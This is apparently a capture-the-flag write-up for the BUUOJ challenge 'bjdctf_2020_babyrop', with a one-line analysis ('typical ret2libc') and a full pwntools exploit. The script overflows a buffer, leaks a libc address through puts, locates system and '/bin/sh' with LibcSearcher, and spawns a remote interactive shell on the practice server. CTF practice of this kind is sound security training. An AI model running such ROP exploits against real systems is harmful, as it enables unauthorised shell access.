---
title: "bjdctf_2020_babyrop"
description: ""
date: 2023-04-07T13:46:30+08:00
lastmod: 2023-04-07T13:46:30+08:00
draft: false
images: []
type: docs
weight: 982
toc: true
---

## 0x01 分析

![18e7be6fc03d5a816cb5c7a431fdefe8](images/18e7be6fc03d5a816cb5c7a431fdefe8.png)  

典型的ret2libc

## 0x02 Exploit

```python
from pwn import*
from LibcSearcher import*
# context.log_level = 'debug'
# o = process("./pwn")
o = remote("node4.buuoj.cn", 29543)
elf = ELF("./pwn")

puts_plt = elf.plt['puts']
read_got = elf.got['read']
vuln = elf.sym['vuln']
pop_rdi = 0x0000000000400733
o.recvuntil(b'story!\n')
payload = b'a'*40 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(vuln)
o.sendline(payload)
read_addr = u64(o.recv(6) + b"\x00\x00")
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")
log.info(hex(libc_base))
sys_addr = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

# attack
o.recvuntil(b'story!\n')
payload = b'a'*40 + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) + p64(vuln)
o.sendline(payload)
o.interactive()

```

![529dec017a4eb417633fbc942c5b885b](images/529dec017a4eb417633fbc942c5b885b.png)

自行调试
